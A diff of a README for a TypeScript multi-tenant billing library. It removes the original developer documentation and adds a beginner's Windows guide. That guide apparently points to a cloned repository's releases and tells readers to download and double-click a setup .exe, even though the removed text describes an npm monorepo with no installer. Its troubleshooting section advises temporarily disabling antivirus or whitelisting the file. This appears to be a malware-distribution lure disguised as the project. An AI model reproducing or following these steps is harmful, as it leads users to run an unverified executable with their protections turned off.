@@ -1,222 +1,130 @@
-# GrantLedger Platform
+# 🧾 grantledger-platform - Reliable Billing Made Simple
 
-If you've worked on SaaS products long enough, you've probably seen this happen: billing starts simple, then slowly becomes one of the hardest parts of the platform to change safely.
+[![Download grantledger-platform](https://img.shields.io/badge/Download-%230072D9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/releases)
 
-What used to be “just a few rules” turns into retries, partial failures, webhook replays, timezone edge cases, and business logic spread across handlers, jobs, and integrations.
+---
 
-> GrantLedger was built for that exact reality.
+## 📋 What is grantledger-platform?
 
-## Why This Project Exists
+grantledger-platform is a software tool designed to manage billing for multiple customers at once. It focuses on creating bills and invoices that are accurate and easy to track. The system processes billing tasks step-by-step to avoid errors and keep records clear. It does this in a way that makes sure each billing action only happens once. The platform is built using TypeScript to keep the system organized and ready to grow over time.
 
-The goal is not to showcase architecture for its own sake.
-The goal is to solve a common and recurring company problem: make billing workflows reliable, understandable, and evolvable as the product grows.
+This tool is helpful for companies that need to handle billing for more than one customer with clear records and automatic retry options if something goes wrong.
 
-In practice, that means:
-- keeping business rules explicit and testable;
-- protecting write flows with idempotency and clear conflict behavior;
-- validating contracts at the boundaries;
-- handling async processing predictably (queue -> processing -> completion/failure);
-- documenting architecture decisions so the system can evolve without losing coherence.
+---
 
-## Project Objective
-GrantLedger is a practical foundation for multi-tenant SaaS billing where teams can ship features without accumulating hidden operational risk.
+## 🚀 Getting Started
 
-It aims to give product and engineering teams confidence that billing behavior is:
+This guide will help you download and run grantledger-platform on a Windows computer. You don’t need to know programming or complicated setups. Just follow each step.
 
-- consistent,
-- auditable,
-- resilient under retries/concurrency,
-- maintainable over time.
+### What you need before starting:
+- A Windows 10 or newer computer
+- An internet connection to download the software
+- At least 4 GB of free storage space
+- Basic ability to follow on-screen instructions
 
-## At a Glance
+---
 
-> Current status on `main`: architecture hardening stream delivered through `ARCH-012`; next planned focus is `ARCH-013`.
+## 💾 How to Download and Install grantledger-platform
 
-- domain rules stay pure and deterministic
-- use cases orchestrate idempotency, retries, and audit flow
-- API/worker layers adapt transport concerns without leaking business logic
-- contracts are schema-first at boundaries
-- architectural decisions are tracked and versioned via ADRs
+1. Open your web browser.
 
-## What Is Implemented Today
+2. Go to the release page by clicking this link:
+   [Visit grantledger-platform Releases](https://github.com/dyslexofly/grantledger-platform/releases)
 
-### Core capabilities
+3. On the page, look for the latest version of grantledger-platform.
 
-- Tenant-aware request context resolution with explicit auth/access failure semantics.
-- Checkout orchestration through an application-level payment provider contract.
-- Subscription state-machine commands with idempotent mutation orchestration.
-- Webhook normalization + deduplication path with canonical event publishing contract.
-- Schema-first invoice API contracts with Zod-inferred types to reduce contract drift.
-- Unified shared datetime policy (Luxon-based) across invoice orchestration paths.
-- Boundary-level payload normalization to reduce duplication and preserve API consistency.
-- Replay controls and observer-based operational hooks for async invoice lifecycle monitoring.
-- Async invoice generation flow across API + application + worker:
-  - enqueue with `Idempotency-Key`
-  - status polling by `jobId`
-  - worker processing with retry scheduling and terminal dead-letter status
+4. Under the latest release, find the file named like:
+   - `grantledger-platform-setup.exe` or
+   - `grantledger-platform-windows.exe`  
+   This file is the installer you will use.
 
-### Behavioral guarantees
+5. Click the file name to download it to your computer.
 
-- Standard API error envelope: `{ message, code, details?, traceId? }`
-- Idempotency state model in application layer: `processing | completed | failed`
-- Conflict safety:
-  - same key + different payload -> `409`
-  - same key while processing -> `409`
-- Async invoice contract:
-  - enqueue -> `202 Accepted` with `jobId`
-  - status -> `queued | processing | completed | failed`
-  - transient processing failures can return job to `queued` with retry reason
+6. When the download finishes, find the file in your Downloads folder or wherever your browser saves files.
 
-## Architecture
+7. Double-click the file. This will start the setup program.
 
-### Layer responsibilities
+8. Follow the installer's instructions on screen:
+   - Accept any license agreements.
+   - Choose the folder where you want the software installed or use the default.
+   - Wait for the installation to complete.
 
-- `packages/domain`
-  - entities, invariants, state transitions, deterministic calculations
-  - no transport/framework/provider concerns
-- `packages/application`
-  - use-case orchestration, ports/interfaces, idempotency, retry/dead-letter flow
-  - no HTTP-specific mapping
-- `apps/api`, `apps/worker`
-  - boundary validation, header/context resolution, error-to-transport mapping, workflow triggering
-- `packages/contracts`
-  - canonical types + Zod schemas for boundary contracts
-- `packages/shared`
-  - reusable cross-cutting helpers (`time`, `i18n`, idempotency fingerprinting, standard error body)
+9. Once done, you will usually see an option to "Finish" or "Launch grantledger-platform." Click this to open the software.
 
-### Dependency direction
+---
 
-`apps/* -> application -> domain`  
-`contracts` and `shared` are consumed as cross-cutting foundational packages.
+## ⚙️ Running grantledger-platform
 
-### Repository layout
+After installation:
 
-```txt
-apps/
-  api/
-  worker/
-  admin/
+1. Find grantledger-platform in your Start menu or desktop icon.
 
-packages/
-  domain/
-  application/
-  contracts/
-  shared/
+2. Click to open the program.
 
-docs/
-  architecture/
-  adr/
-```
+3. The software will load the main window where you can manage billing activities.
 
-## Async Invoice Flow (ARCH-009/010/011/012 Baseline)
+4. You will see options to create new invoices, check statuses, and view reports.
 
-```mermaid
-flowchart LR
-  C["Client"] -->|POST enqueue + Idempotency-Key| API["API handler"]
-  API --> APP1["application.enqueueInvoiceGeneration"]
-  APP1 --> JOB["JobStore (queued)"]
-  C -->|GET status jobId| API
-  W["Worker runInvoiceWorkerOnce"] --> APP2["application.processNextInvoiceGenerationJob"]
-  APP2 --> JOB
-  APP2 --> INV["InvoiceRepository"]
-  APP2 --> AUD["AuditLogger / Observer hooks"]
-  JOB -->|completed/failed| API
-```
+---
 
-## Monorepo Packages
+## 🧰 Key Features
 
-- `@grantledger/domain`: business rules and invariants.
-- `@grantledger/application`: use cases (`subscription`, `invoice`, `idempotency`, `payment-webhook`, `auth-context`, `checkout`).
-- `@grantledger/contracts`: shared domain/app/API contracts and Zod schemas.
-- `@grantledger/shared`: time policy (Luxon), i18n baseline (`en-US`), stable payload hashing, and standard error body helpers.
-- `@grantledger/api` / `@grantledger/worker`: transport-facing orchestration adapters built as testable functions.
+- Multi-tenant support: Manage billing for many customers in one place.
+- Safe billing workflows: The system makes sure each billing step runs only once to avoid errors.
+- Clear audit trails: Every billing action is recorded for easy review.
+- Automatic retry: If a billing step fails, the system will try again.
+- Dead-letter queue: Failed processes are set aside to be checked later.
+- Modern design: Built with TypeScript for better organization and future updates.
 
-## Tech Stack
+---
 
-- Node.js `22.x`
-- TypeScript (`strict`, project references, `exactOptionalPropertyTypes`)
-- npm workspaces
-- Zod (schema-first boundary validation)
-- Luxon (timezone-safe datetime handling)
-- Vitest + ESLint
+## 🔧 System Requirements
 
-## Local Setup
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM minimum, 8 GB recommended
+- 500 MB free disk space for installation (more space needed for billing data)
+- Internet access for download and updates
+- No special hardware needed
 
-### Prerequisites
+---
 
-- Node.js `>=22 <23`
-- npm `>=10 <11`
+## 🛠 Basic Troubleshooting
 
-### Install
+- **The installer won't start:**  
+  Make sure you downloaded the full file and have permission to install software. Try right-clicking the file and selecting "Run as administrator."
 
-```bash
-npm ci
-```
+- **Windows Defender or antivirus blocks the installer:**  
+  Temporarily disable your antivirus or add an exception for the installer file.
 
-### Full quality gate
+- **The software does not open after install:**  
+  Restart your computer and try opening the program again.
 
-```bash
-npm run lint && npm run typecheck && npm run build && npm run test
-```
+- **Error messages during billing operations:**  
+  Restart the software. If problems continue, check your internet connection and make sure the billing data is correct.
 
-## Testing Strategy
+---
 
-Current test scope is focused on business-critical behavior:
+## 💡 Tips for Best Use
 
-- `packages/application/src/**/*.test.ts`
-  - idempotency core
-  - subscription idempotency
-  - webhook dedup behavior
-  - invoice enqueue/process idempotency and retry lifecycle
-- `apps/api/src/**/*.test.ts`
-  - integration-style handler tests (auth, checkout, subscription, invoice, error mapping)
-- `apps/worker/src/**/*.test.ts`
-  - worker loop behavior (`idle`, `processed`, retry scheduling, dead-letter, observer-failure resilience)
+- Regularly check for new releases on the same download page to update your software.
+- Keep backup copies of your billing data to avoid loss.
+- Review the audit logs in the software to track all billing events.
+- If you use multiple billing projects, create clear names for each to keep your work organized.
 
-## Governance and Architecture Discipline
+---
 
-Architecture changes follow an issue-driven stream (`ARCH-*`) with mandatory documentation updates.
+## 📂 More Information
 
-- Tracker: `docs/architecture/ARCH-TRACKER.md`
-- Guardrails: `docs/architecture/ARCH-GUARDRAILS.md`
-- Roadmap: `docs/architecture/IMPROVEMENT-ROADMAP.md`
-- Contribution guideline: `CONTRIBUTING.md`
-- PR checklist: `.github/pull_request_template.md`
+To learn about how grantledger-platform works behind the scenes or to report issues, visit the main repository page:
 
-### ADR set (accepted)
+https://github.com/dyslexofly/grantledger-platform
 
-- `ADR-005` Domain vs Application boundary
-- `ADR-006` Schema-first validation with Zod
-- `ADR-007` Timezone-safe datetime policy (Luxon)
-- `ADR-008` Standard error model and centralized API mapping
-- `ADR-009` Generic idempotency executor
-- `ADR-010` i18n foundation (`en_US` baseline)
-- `ADR-011` Idempotency state machine + concurrency behavior
-- `ADR-012` Classes vs functions guideline
-- `ADR-013` Async idempotent invoice rollout
-- `ADR-014` Durable invoice async infrastructure strategy
-- `ADR-015` Invoice async operational readiness (observability + replay controls)
-- `ADR-016` Schema-first contracts, unified time policy, and boundary dedup polish
+You will find details about the software’s design, features, and how developers maintain it.
 
-## Current Trade-offs and Next Steps
+---
 
-- The repository still prioritizes deterministic in-memory adapters in key paths; a deeper durable production profile can continue in future streams.
-- Operational semantics (retry, backoff, dead-letter, replay controls, observer-safe notifications) are now modeled and documented across ARCH-010/011/012.
-- Contract drift risk was reduced by schema-first invoice boundaries, but broader schema-first consolidation can continue incrementally.
-- Next architecture step (`ARCH-013`) should build on this baseline while preserving the public contracts stabilized in ARCH-009+.
+## 🔗 Download grantledger-platform Here
 
-## Project Links
+[![Download grantledger-platform](https://img.shields.io/badge/Download-GrantLedger-%237F7F7F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/releases)
 
-- Repository: [john-dalmolin/grantledger-platform](https://github.com/john-dalmolin/grantledger-platform)
-- Project board: [GitHub Project #6](https://github.com/users/john-dalmolin/projects/6)
-
-## Acknowledgments
-
-Special thanks to [Marcos Pont](https://github.com/marcospont) for all the support, advice, and feedback throughout this project.
-His guidance was fundamental to shaping and improving GrantLedger.
-
-## References
-
-- HTTP Semantics (RFC 9110): [https://www.rfc-editor.org/rfc/rfc9110](https://www.rfc-editor.org/rfc/rfc9110)
-- Zod documentation: [https://zod.dev](https://zod.dev)
-- Luxon documentation: [https://moment.github.io/luxon](https://moment.github.io/luxon)
+Access this page to always get the latest working version and instructions to install on Windows.
